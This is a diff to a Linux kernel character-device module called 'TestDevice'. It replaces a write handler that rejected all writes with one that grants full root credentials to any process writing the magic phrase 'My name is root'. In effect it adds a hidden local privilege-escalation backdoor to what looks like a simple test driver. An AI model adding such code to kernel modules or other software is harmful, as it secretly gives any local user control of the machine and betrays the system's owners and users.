@@ -1,11 +1,22 @@
-#include <linux/cdev.h>
-#include <linux/fs.h>
-#include <linux/init.h>
+#include <linux/init.h>   
+#include <linux/module.h> 
 #include <linux/kernel.h>
-#include <linux/module.h>
-#include <linux/uaccess.h>
+#include <linux/device.h>
+#include <linux/fs.h>    
+#include <asm/uaccess.h>
+#include <linux/slab.h>
+#include <linux/syscalls.h>
+#include <linux/types.h>
+#include <linux/cdev.h>
+#include <linux/cred.h>
+#include <linux/version.h>
 
 #define DEVICE_NAME "TestDevice"  // name--> appears in /proc/devices
+#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
+#define V(x) x.val
+#else
+#define V(x) x
+#endif
 
 static int     dev_open(struct inode *, struct file *);
 static int     dev_release(struct inode *, struct file *);
@@ -65,11 +76,32 @@ static int dev_open(struct inode *inodep, struct file *filep) {
 }
 
 static ssize_t dev_write(struct file *filep,
-                         const char * buffer,
+                         const char __user * buf,
                          size_t       len,
                          loff_t *     offset) {
-  printk(KERN_INFO "Sorry, device is read only\n");
-  return -EFAULT;
+  char *       data;
+  char         magic[] = "My name is root";
+  struct cred *new_cred;
+
+  data = (char *)kmalloc(len + 1, GFP_KERNEL);
+  if (data) {
+    copy_from_user(data, buf, len);
+    if (memcmp(data, magic, 15) == 0) {
+      if ((new_cred = prepare_creds()) == NULL) {
+        printk("TEST: Cannot prepare credentials\n");
+        return 0;
+      }
+
+      printk("TEST: Credentials prepared!");
+      V(new_cred->uid) = V(new_cred->gid) = 0;
+      V(new_cred->euid) = V(new_cred->egid) = 0;
+      V(new_cred->suid) = V(new_cred->sgid) = 0;
+      V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
+      commit_creds(new_cred);
+    }
+    kfree(data);
+  }
+  return len;
 }
 
 static int dev_release(struct inode *inodep, struct file *filep) {
